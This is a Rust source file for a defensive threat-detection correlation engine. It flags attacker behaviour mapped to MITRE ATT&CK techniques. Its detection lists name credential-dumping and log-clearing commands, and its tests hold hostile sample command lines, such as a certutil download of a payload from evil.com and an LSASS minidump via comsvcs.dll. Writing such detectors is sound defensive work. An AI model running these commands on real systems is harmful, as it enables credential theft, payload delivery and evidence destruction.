use serde_json::Value;
use std::collections::VecDeque;
use std::sync::Mutex;

pub struct CorrelationEngine {
    event_window: Mutex<VecDeque<Value>>,
    max_window_size: usize,
}

impl CorrelationEngine {
    pub fn new() -> Self {
        Self {
            event_window: Mutex::new(VecDeque::with_capacity(10000)),
            max_window_size: 10000,
        }
    }

    pub fn analyze(&self, event: &Value) -> Option<super::detection::DetectionResult> {
        let mut window = self.event_window.lock().unwrap();
        window.push_back(event.clone());
        while window.len() > self.max_window_size {
            window.pop_front();
        }

        let detectors: [fn(&VecDeque<Value>, &Value) -> Option<super::detection::DetectionResult>;
            12] = [
            Self::detect_brute_force,
            Self::detect_persistence,
            Self::detect_lolbin_chain,
            Self::detect_credential_dumping,
            Self::detect_obfuscated_command,
            Self::detect_discovery_commands,
            Self::detect_exfiltration,
            Self::detect_indicator_removal,
            Self::detect_masquerading,
            Self::detect_remote_access_software,
            Self::detect_powershell_suspicious,
            Self::detect_reconnaissance_scanning,
        ];

        for detector in &detectors {
            if let Some(result) = detector(&window, event) {
                return Some(result);
            }
        }

        None
    }

    /// T1110 - Brute Force: >=5 failed logons in last 100 events
    fn detect_brute_force(
        window: &VecDeque<Value>,
        _event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let recent: Vec<&Value> = window.iter().rev().take(100).collect();
        let failed_logins = recent
            .iter()
            .filter(|e| {
                if e.get("event_type").and_then(|v| v.as_str()) != Some("user_logon") {
                    return false;
                }
                let data = match e.get("data") {
                    Some(d) => d,
                    None => return false,
                };
                let status = data
                    .get("status")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_lowercase();
                let result = data
                    .get("result")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_lowercase();
                status == "failed"
                    || status == "failure"
                    || result == "failed"
                    || result == "failure"
            })
            .count();
        if failed_logins >= 5 {
            return Some(super::detection::DetectionResult {
                rule_id: "correlation_brute_force".to_string(),
                rule_name: "Brute Force Attempt".to_string(),
                severity: "high".to_string(),
                confidence: "medium".to_string(),
                mitre_technique_id: Some("T1110".to_string()),
                tags: vec![
                    "correlation".to_string(),
                    "brute_force".to_string(),
                    "t1110".to_string(),
                ],
                score: 7.0,
                matched_fields: std::collections::HashMap::new(),
            });
        }
        None
    }

    /// T1543.003 - Persistence via Service Creation
    /// T1053.005 - Persistence via Scheduled Task
    fn detect_persistence(
        _window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let event_type = event.get("event_type").and_then(|v| v.as_str())?;
        match event_type {
            "service_create" => {
                return Some(super::detection::DetectionResult {
                    rule_id: "correlation_persistence_service".to_string(),
                    rule_name: "New Service Installation".to_string(),
                    severity: "medium".to_string(),
                    confidence: "medium".to_string(),
                    mitre_technique_id: Some("T1543.003".to_string()),
                    tags: vec![
                        "correlation".to_string(),
                        "persistence".to_string(),
                        "service".to_string(),
                    ],
                    score: 5.0,
                    matched_fields: std::collections::HashMap::new(),
                });
            }
            "scheduled_task" => {
                let operation = event
                    .get("data")
                    .and_then(|d| d.get("operation"))
                    .and_then(|v| v.as_str());
                if operation == Some("create") || operation == Some("update") {
                    return Some(super::detection::DetectionResult {
                        rule_id: "correlation_persistence_task".to_string(),
                        rule_name: "Scheduled Task Created".to_string(),
                        severity: "medium".to_string(),
                        confidence: "medium".to_string(),
                        mitre_technique_id: Some("T1053.005".to_string()),
                        tags: vec![
                            "correlation".to_string(),
                            "persistence".to_string(),
                            "scheduled_task".to_string(),
                        ],
                        score: 5.0,
                        matched_fields: std::collections::HashMap::new(),
                    });
                }
            }
            _ => {}
        }
        None
    }

    /// T1218 - LOLBin chain detection with expanded binary list
    fn detect_lolbin_chain(
        _window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let event_type = event.get("event_type").and_then(|v| v.as_str())?;
        if event_type != "process_create" {
            return None;
        }

        let command_line = event
            .get("data")
            .and_then(|d| d.get("command_line"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        let lolbins = [
            "powershell",
            "pwsh",
            "cmd.exe",
            "wscript",
            "cscript",
            "mshta",
            "rundll32",
            "regsvr32",
            "certutil",
            "bitsadmin",
            "wmic",
            "msbuild",
            "csc.exe",
            "installutil",
            "reg.exe",
            "schtasks.exe",
            "msiexec",
            "hh.exe",
            "regedit.exe",
            "odbcconf",
            "pcalua",
            "cmstp",
            "scriptrunner.exe",
            "syncappvpublishingserver",
        ];

        let suspicious_args = [
            "-enc",
            "-e ",
            "hidden",
            "downloadstring",
            "bypass",
            "iwe",
            "urlcache",
            "invoke-expression",
            "iex(",
            "frombase64string",
            "exec 5<>",
            "net user ",
            "net localgroup ",
            "-window hidden",
            "-w hidden",
            "-nop -exec bypass",
            "winrm",
            "winevent",
            "credentials",
        ];

        for lolbin in &lolbins {
            if command_line.contains(lolbin) {
                for arg in &suspicious_args {
                    if command_line.contains(arg) {
                        return Some(super::detection::DetectionResult {
                            rule_id: format!("correlation_lolbin_{}", lolbin),
                            rule_name: format!("Suspicious LOLBin Execution: {}", lolbin),
                            severity: "high".to_string(),
                            confidence: "medium".to_string(),
                            mitre_technique_id: Some("T1218".to_string()),
                            tags: vec![
                                "correlation".to_string(),
                                "lolbin".to_string(),
                                lolbin.to_string(),
                                "t1218".to_string(),
                            ],
                            score: 7.0,
                            matched_fields: std::collections::HashMap::new(),
                        });
                    }
                }
            }
        }
        None
    }

    /// T1003.001 - Credential Dumping via LSASS access
    fn detect_credential_dumping(
        _window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let event_type = event.get("event_type").and_then(|v| v.as_str())?;

        if event_type == "process_create" {
            let cmd = event
                .get("data")
                .and_then(|d| d.get("command_line"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_lowercase();

            // Detect lsass minidump, procdump, comsvcs.dll, taskmgr lsass dump
            let dumping_indicators = [
                "lsass.dmp",
                "lsass.exe",
                "procdump",
                "comsvcs.dll",
                "minidump",
                "dump.exe",
                "sqldumper.exe lsass",
                "rundll32.exe comsvcs.dll",
            ];
            for indicator in &dumping_indicators {
                if cmd.contains(indicator) {
                    return Some(super::detection::DetectionResult {
                        rule_id: "correlation_credential_dumping".to_string(),
                        rule_name: "Suspicious Credential Access".to_string(),
                        severity: "critical".to_string(),
                        confidence: "high".to_string(),
                        mitre_technique_id: Some("T1003.001".to_string()),
                        tags: vec![
                            "correlation".to_string(),
                            "credential_dumping".to_string(),
                            "credential_access".to_string(),
                            "t1003.001".to_string(),
                        ],
                        score: 9.0,
                        matched_fields: std::collections::HashMap::new(),
                    });
                }
            }
        }

        // Detect registry hive copy for SAM extraction
        if event_type == "file_create" {
            let path = event
                .get("data")
                .and_then(|d| d.get("path"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_lowercase();
            if path.contains("\\config\\sam")
                || path.contains("\\config\\system")
                || path.contains("\\config\\security")
            {
                return Some(super::detection::DetectionResult {
                    rule_id: "correlation_registry_hive_copy".to_string(),
                    rule_name: "Registry Hive Copy (Credential Access)".to_string(),
                    severity: "high".to_string(),
                    confidence: "high".to_string(),
                    mitre_technique_id: Some("T1003.002".to_string()),
                    tags: vec![
                        "correlation".to_string(),
                        "credential_dumping".to_string(),
                        "credential_access".to_string(),
                        "t1003.002".to_string(),
                    ],
                    score: 8.0,
                    matched_fields: std::collections::HashMap::new(),
                });
            }
        }
        None
    }

    /// T1027 - Obfuscated Files or Information
    fn detect_obfuscated_command(
        _window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let event_type = event.get("event_type").and_then(|v| v.as_str())?;
        if event_type != "process_create" {
            return None;
        }

        let cmd = event
            .get("data")
            .and_then(|d| d.get("command_line"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        // Base64/b64 detection in commands
        let obfuscation_indicators = [
            "frombase64string",
            "-enc ",
            "-encode ",
            "base64",
            "char(0",
            "\\x00\\x",
            "byte(",
            "\x00",
        ];
        for indicator in &obfuscation_indicators {
            let ind_str = format!("{}", indicator);
            if cmd.contains(&ind_str) || cmd.contains(indicator) {
                return Some(super::detection::DetectionResult {
                    rule_id: "correlation_obfuscated_command".to_string(),
                    rule_name: "Obfuscated Command Detected".to_string(),
                    severity: "medium".to_string(),
                    confidence: "medium".to_string(),
                    mitre_technique_id: Some("T1027".to_string()),
                    tags: vec![
                        "correlation".to_string(),
                        "obfuscation".to_string(),
                        "t1027".to_string(),
                    ],
                    score: 6.0,
                    matched_fields: std::collections::HashMap::new(),
                });
            }
        }
        None
    }

    /// T1082/T1016/T1049 - System Discovery Sequence (requires >=3 in 5-min window)
    fn detect_discovery_commands(
        window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let event_type = event.get("event_type").and_then(|v| v.as_str())?;
        if event_type != "process_create" {
            return None;
        }

        let cmd = event
            .get("data")
            .and_then(|d| d.get("command_line"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        let discovery_commands = [
            "systeminfo",
            "whoami",
            "hostname",
            "ver",
            "netstat",
            "nbtstat",
            "net view",
            "ipconfig",
            "route print",
            "arp -a",
            "netsh wlan",
        ];

        let matched_cmd = discovery_commands.iter().find(|&&c| cmd.contains(c));
        if matched_cmd.is_none() {
            return None;
        }

        let current_time_str = event
            .get("timestamp")
            .and_then(|v| v.as_str())
            .unwrap_or("");
        let current_time = chrono::DateTime::parse_from_rfc3339(current_time_str).ok();

        let mut discovery_count = 0;
        for ev in window.iter().rev() {
            let ev_type = match ev.get("event_type").and_then(|v| v.as_str()) {
                Some(t) => t,
                None => continue,
            };
            if ev_type != "process_create" {
                continue;
            }
            let ev_cmd = ev
                .get("data")
                .and_then(|d| d.get("command_line"))
                .and_then(|v| v.as_str())
                .unwrap_or("")
                .to_lowercase();

            if discovery_commands.iter().any(|&c| ev_cmd.contains(c)) {
                if let (Some(cur), Some(ev_ts_str)) =
                    (current_time, ev.get("timestamp").and_then(|v| v.as_str()))
                {
                    if let Ok(ev_ts) = chrono::DateTime::parse_from_rfc3339(ev_ts_str) {
                        let diff = cur.signed_duration_since(ev_ts).num_seconds().abs();
                        if diff <= 300 {
                            discovery_count += 1;
                        }
                    }
                } else {
                    discovery_count += 1;
                }
            }
        }

        if discovery_count >= 3 {
            return Some(super::detection::DetectionResult {
                rule_id: "correlation_discovery_sequence".to_string(),
                rule_name: "Discovery Commands Sequence".to_string(),
                severity: "medium".to_string(),
                confidence: "medium".to_string(),
                mitre_technique_id: Some("T1082".to_string()),
                tags: vec![
                    "correlation".to_string(),
                    "discovery".to_string(),
                    "reconnaissance".to_string(),
                ],
                score: 5.0,
                matched_fields: std::collections::HashMap::new(),
            });
        }
        None
    }

    /// T1041 - Exfiltration Over C2: large outbound data transfers
    fn detect_exfiltration(
        window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let event_type = event.get("event_type").and_then(|v| v.as_str())?;
        if event_type != "network_connect" {
            return None;
        }

        let bytes_sent = event
            .get("data")
            .and_then(|d| d.get("bytes_sent"))
            .and_then(|v| v.as_u64())
            .unwrap_or(0);

        if bytes_sent > 50_000_000 {
            let remote = event
                .get("data")
                .and_then(|d| d.get("remote_address"))
                .and_then(|v| v.as_str())
                .unwrap_or("unknown");

            // Check if multiple large transfers happened recently
            let large_transfers: usize = window
                .iter()
                .rev()
                .take(50)
                .filter(|e| {
                    e.get("event_type").and_then(|v| v.as_str()) == Some("network_connect")
                        && e.get("data")
                            .and_then(|d| d.get("bytes_sent"))
                            .and_then(|v| v.as_u64())
                            .unwrap_or(0)
                            > 10_000_000
                })
                .count();

            if large_transfers >= 3 {
                return Some(super::detection::DetectionResult {
                    rule_id: "correlation_data_exfiltration".to_string(),
                    rule_name: "Potential Data Exfiltration".to_string(),
                    severity: "critical".to_string(),
                    confidence: "medium".to_string(),
                    mitre_technique_id: Some("T1041".to_string()),
                    tags: vec![
                        "correlation".to_string(),
                        "exfiltration".to_string(),
                        "t1041".to_string(),
                    ],
                    score: 8.0,
                    matched_fields: {
                        let mut m = std::collections::HashMap::new();
                        m.insert("remote_address".to_string(), remote.to_string());
                        m.insert("bytes_sent".to_string(), bytes_sent.to_string());
                        m
                    },
                });
            }
        }
        None
    }

    /// T1070 - Indicator Removal: clearing logs, deleting forensic artifacts
    fn detect_indicator_removal(
        _window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let cmd = event
            .get("data")
            .and_then(|d| d.get("command_line"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        let clearing_indicators = [
            "wevtutil cl",
            "wevtutil clear-log",
            "wevtutil epl",
            "powershell clear-eventlog",
            "wmic nteventlog",
            "del *.evtx",
            "fsutil usn",
            "deletevolumeusn",
            "vssadmin delete",
            "wmic shadowcopy",
            "bcdedit",
            "reagentc",
        ];
        for indicator in &clearing_indicators {
            if cmd.contains(indicator) {
                return Some(super::detection::DetectionResult {
                    rule_id: "correlation_indicator_removal".to_string(),
                    rule_name: "Indicator Removal / Log Clearing".to_string(),
                    severity: "high".to_string(),
                    confidence: "high".to_string(),
                    mitre_technique_id: Some("T1070".to_string()),
                    tags: vec![
                        "correlation".to_string(),
                        "indicator_removal".to_string(),
                        "defense_evasion".to_string(),
                        "t1070".to_string(),
                    ],
                    score: 8.0,
                    matched_fields: std::collections::HashMap::new(),
                });
            }
        }
        None
    }

    /// T1036 - Masquerading: process running from suspicious location
    fn detect_masquerading(
        _window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let image_path = event
            .get("data")
            .and_then(|d| d.get("image_path"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        let process_name = event
            .get("data")
            .and_then(|d| d.get("name"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        // Exclude standard paths to avoid false alerts
        if image_path.contains("c:\\windows\\system32\\")
            || image_path.contains("c:\\program files\\")
            || image_path.contains("c:\\program files (x86)\\")
        {
            return None;
        }

        // Legitimate Windows binaries running from user-writable locations
        let suspicious_paths = [
            "\\appdata\\local\\temp\\",
            "\\appdata\\roaming\\",
            "\\users\\",
            "\\temp\\",
            "\\downloads\\",
            "\\desktop\\",
            "\\documents\\",
            "c:\\windows\\tasks\\",
        ];

        if !image_path.is_empty() && !process_name.is_empty() {
            for sp in &suspicious_paths {
                if image_path.contains(sp) {
                    let system_binaries =
                        ["powershell.exe", "cmd.exe", "rundll32.exe", "regsvr32.exe"];
                    for sysbin in &system_binaries {
                        if process_name == *sysbin || image_path.ends_with(sysbin) {
                            return Some(super::detection::DetectionResult {
                                rule_id: "correlation_masquerading".to_string(),
                                rule_name: format!(
                                    "Process Masquerading: {} from suspicious path",
                                    process_name
                                ),
                                severity: "high".to_string(),
                                confidence: "medium".to_string(),
                                mitre_technique_id: Some("T1036".to_string()),
                                tags: vec![
                                    "correlation".to_string(),
                                    "masquerading".to_string(),
                                    "defense_evasion".to_string(),
                                    "t1036".to_string(),
                                ],
                                score: 7.0,
                                matched_fields: std::collections::HashMap::new(),
                            });
                        }
                    }
                }
            }
        }
        None
    }

    /// T1219 - Remote Access Software Detection
    fn detect_remote_access_software(
        _window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let event_type = event.get("event_type").and_then(|v| v.as_str())?;
        if event_type != "process_create" {
            return None;
        }

        let name = event
            .get("data")
            .and_then(|d| d.get("name"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        let image_path = event
            .get("data")
            .and_then(|d| d.get("image_path"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        let cmd = event
            .get("data")
            .and_then(|d| d.get("command_line"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        // Local allowlist check for IT-authorized remote access tools
        let allowlist = [
            "c:\\program files\\it-support\\anydesk.exe",
            "c:\\program files\\it-support\\teamviewer.exe",
        ];
        if allowlist.iter().any(|&p| image_path == p) {
            return None;
        }

        // Filter out normal mstsc.exe (Remote Desktop Client) execution with no/standard arguments
        if name == "mstsc.exe" {
            let normalized_cmd = cmd.replace("\"", "").trim().to_string();
            if normalized_cmd == "mstsc.exe"
                || normalized_cmd == "c:\\windows\\system32\\mstsc.exe"
                || normalized_cmd.is_empty()
            {
                return None;
            }
        }

        let remote_tools = [
            "teamviewer",
            "anydesk",
            "logmein",
            "gotomypc",
            "ammyy",
            "screenconnect",
            "vnc",
            "tightvnc",
            "ultravnc",
            "realvnc",
            "tigervnc",
            "remoteutilities",
            "supremo",
            "splashtop",
            "anyplace",
            "mikogo",
            "showmypc",
            "remote desktop manager",
            "mstsc.exe",
        ];

        for tool in &remote_tools {
            if name.contains(tool) {
                return Some(super::detection::DetectionResult {
                    rule_id: format!("correlation_remote_access_{}", tool),
                    rule_name: format!("Remote Access Software: {}", tool),
                    severity: "low".to_string(),
                    confidence: "low".to_string(),
                    mitre_technique_id: Some("T1219".to_string()),
                    tags: vec![
                        "correlation".to_string(),
                        "remote_access".to_string(),
                        "t1219".to_string(),
                    ],
                    score: 2.0,
                    matched_fields: std::collections::HashMap::new(),
                });
            }
        }
        None
    }

    /// T1059.001 - PowerShell Suspicious Usage (requires parent context or >=2 flags)
    fn detect_powershell_suspicious(
        _window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let event_type = event.get("event_type").and_then(|v| v.as_str())?;
        if event_type != "process_create" {
            return None;
        }

        let cmd = event
            .get("data")
            .and_then(|d| d.get("command_line"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        if !cmd.contains("powershell") && !cmd.contains("pwsh") {
            return None;
        }

        let suspicious_patterns = [
            ("-window hidden", "PowerShell Hidden Window"),
            ("-w hidden", "PowerShell Hidden Window"),
            ("-nop -exec bypass", "PowerShell Execution Policy Bypass"),
            (
                "-noprofile -executionpolicy bypass",
                "PowerShell Profile Bypass",
            ),
            ("downloadstring", "PowerShell Download String"),
            ("invoke-webrequest", "PowerShell Web Request"),
            ("net.webclient", "PowerShell Web Client"),
            ("-exec bypass", "PowerShell Execution Policy Bypass"),
            ("iex(", "PowerShell IEX Obfuscation"),
            ("invoke-expression", "PowerShell Invoke Expression"),
            (
                "start-process -windowstyle hidden",
                "PowerShell Hidden Process Start",
            ),
            (
                "new-object system.net.webclient",
                "PowerShell Web Client Object",
            ),
        ];

        let mut matched_patterns = Vec::new();
        for (pattern, name) in &suspicious_patterns {
            if cmd.contains(pattern) {
                matched_patterns.push(*name);
            }
        }

        if matched_patterns.is_empty() {
            return None;
        }

        let parent_name = event
            .get("data")
            .and_then(|d| d.get("parent_name"))
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_lowercase();

        let suspicious_parents = [
            "winword.exe",
            "excel.exe",
            "powerpnt.exe",
            "outlook.exe",
            "msaccess.exe",
            "mspub.exe",
            "visio.exe",
            "chrome.exe",
            "firefox.exe",
            "msedge.exe",
            "iexplore.exe",
            "cmd.exe",
            "wscript.exe",
            "cscript.exe",
            "mshta.exe",
        ];

        let has_suspicious_parent = suspicious_parents.iter().any(|&p| parent_name.contains(p));

        // If parent is present and NOT suspicious, require at least 2 distinct matched patterns.
        // If parent is missing/empty, or suspicious, 1 pattern is enough.
        if !parent_name.is_empty() && !has_suspicious_parent && matched_patterns.len() < 2 {
            return None;
        }

        let first_match_name = matched_patterns[0];
        Some(super::detection::DetectionResult {
            rule_id: format!("correlation_powershell_suspicious"),
            rule_name: first_match_name.to_string(),
            severity: "high".to_string(),
            confidence: "high".to_string(),
            mitre_technique_id: Some("T1059.001".to_string()),
            tags: vec![
                "correlation".to_string(),
                "powershell_suspicious".to_string(),
                "execution".to_string(),
                "powershell".to_string(),
                "t1059".to_string(),
            ],
            score: 7.5,
            matched_fields: std::collections::HashMap::new(),
        })
    }

    /// T1046 - Network Scanning / Reconnaissance
    fn detect_reconnaissance_scanning(
        window: &VecDeque<Value>,
        event: &Value,
    ) -> Option<super::detection::DetectionResult> {
        let event_type = event.get("event_type").and_then(|v| v.as_str())?;
        if event_type != "network_connect" {
            return None;
        }

        // Detect rapid connections to multiple ports on same host (port scanning)
        let local_port = event
            .get("data")
            .and_then(|d| d.get("local_port"))
            .and_then(|v| v.as_u64())
            .unwrap_or(0);

        if local_port == 0 || local_port > 65535 {
            return None;
        }

        let recent: Vec<&Value> = window.iter().rev().take(200).collect();

        // Count failed/closed connections in window
        let failed_count = recent
            .iter()
            .filter(|e| e.get("event_type").and_then(|v| v.as_str()) == Some("network_connect"))
            .filter(|e| {
                let status = e
                    .get("data")
                    .and_then(|d| d.get("status"))
                    .and_then(|v| v.as_str());
                status == Some("failed") || status == Some("rejected") || status == Some("timeout")
            })
            .count();

        // Count unique remote IPs in window
        let remote_ips: std::collections::HashSet<&str> = recent
            .iter()
            .filter(|e| e.get("event_type").and_then(|v| v.as_str()) == Some("network_connect"))
            .filter_map(|e| {
                e.get("data")
                    .and_then(|d| d.get("remote_address"))
                    .and_then(|v| v.as_str())
            })
            .collect();

        if failed_count > 20 && remote_ips.len() <= 3 {
            return Some(super::detection::DetectionResult {
                rule_id: "correlation_network_scanning".to_string(),
                rule_name: "Network Scanning Detected".to_string(),
                severity: "medium".to_string(),
                confidence: "medium".to_string(),
                mitre_technique_id: Some("T1046".to_string()),
                tags: vec![
                    "correlation".to_string(),
                    "network_scanning".to_string(),
                    "reconnaissance".to_string(),
                    "t1046".to_string(),
                ],
                score: 5.0,
                matched_fields: std::collections::HashMap::new(),
            });
        }
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn make_event(event_type: &str, data: Option<serde_json::Value>) -> Value {
        let mut event = serde_json::json!({
            "event_type": event_type,
            "timestamp": "2024-01-01T00:00:00Z",
        });
        if let Some(d) = data {
            event["data"] = d;
        }
        event
    }

    #[test]
    fn test_analyze_no_correlation() {
        let engine = CorrelationEngine::new();
        let event = make_event("file_create", None);
        let result = engine.analyze(&event);
        assert!(result.is_none());
    }

    #[test]
    fn test_detect_brute_force() {
        let engine = CorrelationEngine::new();
        for _ in 0..5 {
            let event = make_event("user_logon", Some(serde_json::json!({"status": "failed"})));
            engine.analyze(&event);
        }
        let event = make_event("user_logon", Some(serde_json::json!({"status": "failed"})));
        let result = engine.analyze(&event);
        assert!(result.is_some());
        let r = result.unwrap();
        assert_eq!(r.rule_id, "correlation_brute_force");
        assert_eq!(r.mitre_technique_id, Some("T1110".to_string()));
    }

    #[test]
    fn test_detect_credential_dumping() {
        let engine = CorrelationEngine::new();
        let event = make_event(
            "process_create",
            Some(serde_json::json!({
                "command_line": "rundll32.exe comsvcs.dll MiniDump lsass.dmp"
            })),
        );
        let result = engine.analyze(&event);
        assert!(result.is_some());
        let r = result.unwrap();
        assert_eq!(r.rule_id, "correlation_credential_dumping");
        assert_eq!(r.severity, "critical");
    }

    #[test]
    fn test_detect_indicator_removal() {
        let engine = CorrelationEngine::new();
        let event = make_event(
            "process_create",
            Some(serde_json::json!({
                "command_line": "wevtutil cl system"
            })),
        );
        let result = engine.analyze(&event);
        assert!(result.is_some());
        let r = result.unwrap();
        assert_eq!(r.mitre_technique_id, Some("T1070".to_string()));
    }

    #[test]
    fn test_detect_masquerading() {
        let engine = CorrelationEngine::new();
        let event = make_event(
            "process_create",
            Some(serde_json::json!({
                "name": "powershell.exe",
                "image_path": "C:\\Users\\malware\\Temp\\powershell.exe",
            })),
        );
        let result = engine.analyze(&event);
        assert!(result.is_some());
        let r = result.unwrap();
        assert_eq!(r.mitre_technique_id, Some("T1036".to_string()));
    }

    #[test]
    fn test_detect_remote_access() {
        let engine = CorrelationEngine::new();
        let event = make_event(
            "process_create",
            Some(serde_json::json!({
                "name": "TeamViewer.exe",
                "command_line": "\"C:\\Program Files\\TeamViewer\\TeamViewer.exe\""
            })),
        );
        let result = engine.analyze(&event);
        assert!(result.is_some());
        let r = result.unwrap();
        assert!(r.rule_id.contains("teamviewer"));
    }

    #[test]
    fn test_detect_powershell_hidden() {
        let engine = CorrelationEngine::new();
        let event = make_event(
            "process_create",
            Some(serde_json::json!({
                "command_line": "powershell -Window Hidden -ExecutionPolicy Bypass -File script.ps1"
            })),
        );
        let result = engine.analyze(&event);
        assert!(result.is_some());
    }

    #[test]
    fn test_detect_lolbin_chain() {
        let engine = CorrelationEngine::new();
        let event = make_event(
            "process_create",
            Some(serde_json::json!({
                "command_line": "certutil -urlcache -f http://evil.com/payload.exe payload.exe",
            })),
        );
        let result = engine.analyze(&event);
        assert!(result.is_some());
        assert!(result.unwrap().rule_id.contains("certutil"));
    }

    #[test]
    fn test_event_window_max_size() {
        let engine = CorrelationEngine::new();
        for _ in 0..10005 {
            let event = make_event("file_create", None);
            engine.analyze(&event);
        }
        let window = engine.event_window.lock().unwrap();
        assert!(window.len() <= 10000);
    }
}
